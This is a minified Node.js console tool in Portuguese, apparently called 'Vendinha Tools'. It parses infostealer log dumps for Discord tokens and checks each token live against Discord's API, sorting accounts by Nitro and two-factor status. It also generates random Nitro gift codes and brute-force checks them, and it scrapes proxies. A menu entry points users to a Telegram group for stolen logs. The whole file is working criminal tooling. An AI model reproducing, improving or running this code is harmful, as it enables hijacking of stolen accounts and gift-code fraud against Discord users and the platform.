const fs=require("fs");const path=require("path");const readline=require("readline");const axios=require("axios");const colors=require("colors");const rl=readline.createInterface({input:process.stdin,output:process.stdout});const getDirectory=s=>{return new Promise(e=>{rl.question(s,o=>{o=o.trim();o=o.replace(/\\/g,"\\\\");if(fs.existsSync(o)&&fs.lstatSync(o).isDirectory()){e(o)}else{console.log("    Diretório inválido. Por favor, tente novamente.");e(getDirectory(s))}})})};const findDiscordTokenFiles=o=>{const n=[];const r=["token discord","tokens discord","tokens","token","tokens_discord","token_discord","token","full_tokens","full_token","discord_accounts","discord_account","validated_tokens","validated_token","discordtoken","discordtokens","discord tokens","discord token","discord_tokens","discord_token"];const a=t=>{fs.readdirSync(t).forEach(o=>{const e=path.join(t,o);if(fs.lstatSync(e).isDirectory()){a(e)}else{const s=o.toLowerCase();if(r.some(o=>s.includes(o))){n.push(e)}}})};a(o);return n};const filtrarTokens=async()=>{const o=await getDirectory("    Por favor, insira o diretório de logs: ");const e=path.join(__dirname,"Results");const s=path.join(e,"Tokens.txt");if(!fs.existsSync(e)){fs.mkdirSync(e,{recursive:true})}const t=findDiscordTokenFiles(o);if(t.length===0){console.log("    Nenhum arquivo de tokens foi encontrado. Tente baixar outras logs.");voltarAoMenu();return}const n=/[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/;const r=new Set;t.forEach(e=>{try{const o=fs.readFileSync(e,"utf-8");const s=o.split("\n");s.forEach(o=>{if(n.test(o)){r.add(o.trim())}})}catch(o){console.log(`    Erro ao ler o arquivo ${e}: ${o}`)}});if(r.size===0){console.log("    Nenhum token foi encontrado nos arquivos.");voltarAoMenu();return}const a=[...r];fs.writeFileSync(s,a.join("\n"),"utf-8");console.log(`    O conteúdo dos arquivos foi copiado para ${s}`);voltarAoMenu()};const checkarTokens=async()=>{const e=path.join(__dirname,"Results","Validos.txt");const s=path.join(__dirname,"Results","Invalidos.txt");const o=new Set(fs.readFileSync(path.join(__dirname,"Results","Tokens.txt"),"utf-8").split("\n").map(o=>{if(o.startsWith(",")){return o.substring(1).trim()}return o.trim()}).filter(o=>o!==""));const t=[...o];let n=0;let r=0;for(const a of t){try{const i=await axios.get(`https://discordapp.com/api/v7/users/@me`,{headers:{authorization:`${a}`}});const{data:c}=i;const l=c.authenticator_types.length;const d=c.phone??"None";let o="Nenhum";if(c.premium_type===2){o="Nitro Gaming";fs.appendFileSync(path.join(__dirname,"Results","Nitradas.txt"),a+"\n")}else if(c.premium_type!==2&&c.premium_type>0){o="Nitro Basic";fs.appendFileSync(path.join(__dirname,"Results","Nitradas.txt"),a+"\n")}if(l>0){fs.appendFileSync(path.join(__dirname,"Results","Verificadas.txt"),a+"\n")}else{fs.appendFileSync(path.join(__dirname,"Results","NaoVerificadas.txt"),a+"\n")}if(c.verified){fs.appendFileSync(e,a+"\n");console.log(`\x1b[32m    [VALIDO]\x1b[0m ${a}`);n++}else{fs.appendFileSync(s,a+"\n");console.log(`\x1b[31m    [INVALIDO]\x1b[0m ${a}`);r++}}catch(o){fs.appendFileSync(s,a+"\n");console.log(`\x1b[31m    [INVALIDO]\x1b[0m ${a}`);r++}finally{if(n+r===t.length){console.log(`\x1b[32m    [FINALIZADO]\x1b[0m - Validos: ${n}, Invalidos: ${r}`);voltarAoMenu()}}}};const scrapProxies=async()=>{const o=path.join(__dirname,"Results","Proxies-Scrappados.txt");try{const e=await axios.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all");const s=e.data.split("\r\n");if(s.length===0){console.log("    Nenhum proxy foi encontrado.");voltarAoMenu();return}fs.writeFileSync(o,s.join("\n"),"utf-8");console.log(`    Proxies scrappados foram salvos em ${o}`)}catch(o){console.error(`    Erro ao scrappear proxies: ${o.message}`)}finally{voltarAoMenu()}};const gerarNitro=async()=>{rl.question("    Quantos nitros deseja gerar? ",e=>{e=parseInt(e);if(isNaN(e)||e<=0){console.log("    Número inválido. Por favor, insira um número válido maior que zero.");voltarAoMenu();return}console.log(`    Gerando ${e} Nitros...`);const s=path.join(__dirname,"Results","Nitros.txt");try{for(let o=0;o<e;o++){let o=Math.random()<.5?16:24;const t=generateNitroCode(o);const n=`${t}`;fs.appendFileSync(s,n+"\n","utf-8")}console.log(`    Nitros Gerados e Salvos em Results/Nitros.txt`)}catch(o){console.error(`    Erro Ao Salvar Nitros: ${o.message}`)}console.log("    Geração De Nitros Concluída.");voltarAoMenu()})};const generateNitroCode=e=>{const s="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";let t="";for(let o=0;o<e;o++){t+=s.charAt(Math.floor(Math.random()*s.length))}return t};const checkarGiftCodes=async()=>{const o=path.join(__dirname,"Results","Nitros-Validos.txt");const e=path.join(__dirname,"Results","Nitros-Invalidos.txt");const s=fs.readFileSync(path.join(__dirname,"Results","Nitros.txt"),"utf-8").split("\n").map(o=>o.trim()).filter(o=>o!=="");let t=0;let n=0;for(const r of s){try{const a=await axios.get(`https://discord.com/api/v9/entitlements/gift-codes/${r}`);if(a.status===200){fs.appendFileSync(o,r+"\n");console.log(`\x1b[32m    [VALIDO]\x1b[0m ${r}`);t++}else{fs.appendFileSync(e,r+"\n");console.log(`\x1b[31m    [INVALIDO]\x1b[0m ${r}`);n++}}catch(o){fs.appendFileSync(e,r+"\n");console.log(`\x1b[31m    [INVALIDO]\x1b[0m ${r}`);n++}finally{if(t+n===s.length){console.log(`\x1b[32m    [FINALIZADO]\x1b[0m - Validos: ${t}, Invalidos: ${n}`);voltarAoMenu()}}}};const menu=()=>{console.clear();const o=`
    \x1b[36m██╗   ██╗███████╗███╗   ██╗██████╗ ██╗███╗   ██╗██╗  ██╗ █████╗\x1b[0m     ████████╗ ██████╗  ██████╗ ██╗     ███████╗
    \x1b[36m██║   ██║██╔════╝████╗  ██║██╔══██╗██║████╗  ██║██║  ██║██╔══██╗\x1b[0m    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
    \x1b[36m██║   ██║█████╗  ██╔██╗ ██║██║  ██║██║██╔██╗ ██║███████║███████║\x1b[0m       ██║   ██║   ██║██║   ██║██║     ███████╗
    \x1b[36m╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║  ██║██║██║╚██╗██║██╔══██║██╔══██║\x1b[0m       ██║   ██║   ██║██║   ██║██║     ╚════██║
    \x1b[36m ╚████╔╝ ███████╗██║ ╚████║██████╔╝██║██║ ╚████║██║  ██║██║  ██║\x1b[0m       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
    \x1b[36m  ╚═══╝  ╚══════╝╚═╝  ╚═══╝╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝\x1b[0m       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝`;console.log(o);console.log("    Feito Por YnSoy @ynsoy, @coffe0313 Fez as Letras\n");console.log("    Escolha uma opção:\n");console.log("[36m        Aba Tokens:                               Aba Proxys:                               Aba Nitros:[0m");console.log("    1. Filtrar Tokens                         3. Proxy Scrapper                         5. Gerar Nitro");console.log("    2. Checkar Tokens                         4. Proxy Checker                          6. Checkar Nitro\n\n");console.log("[36m        Aba Metodos:[0m");console.log("    7. Metodo Tokens\n\n");console.log("[36m        Aba Outros:[0m");console.log("    0. Sair\n");rl.question("    Digite o número da opção: ",async o=>{switch(o){case"1":await filtrarTokens();break;case"2":await checkarTokens();break;case"3":await scrapProxies();break;case"4":console.log("    Proxy Checker Script ainda Não Implementado.");voltarAoMenu();break;case"5":gerarNitro();break;case"6":checkarGiftCodes();break;case"7":console.log(`\n\x1b[36m    Baixe o Telegram
    Entre no Grupo de Logs "https://t.me/+lTv-USNAHHIwODE6"\x1b[0m

    Após Entrar Baixe as Logs e Extraia em uma Pasta Vazia. e Com a Vendinha Tools, e Use o Filtrador de Tokens, Selecione o Diretório Das Logs e Espere os Tokens Serem Colocados em "./Results/Tokens.txt"
    e Para Checar Use o Site
    "https://dcchecker.online/" Ou Use o "Checker Token" da Vendinha Tools

\x1b[31m    Caso Você Vaze Nosso Metodo de Tokens, Ira Ser Banido e Sua Key Da Vendinha Ira Ser Bloqueada, e Você Ira Parar de Receber Atualizações da Tools.\x1b[0m`);voltarAoMenu();break;case"S":console.log("    Saindo...");rl.close();break;case"C":console.log("    Criado Por @YnSoy");break;default:console.log("    Opção inválida. Tente novamente.");menu();break}})};const voltarAoMenu=()=>{rl.question("\n    Pressione ENTER para voltar ao menu inicial...",()=>{console.clear();menu()})};menu();
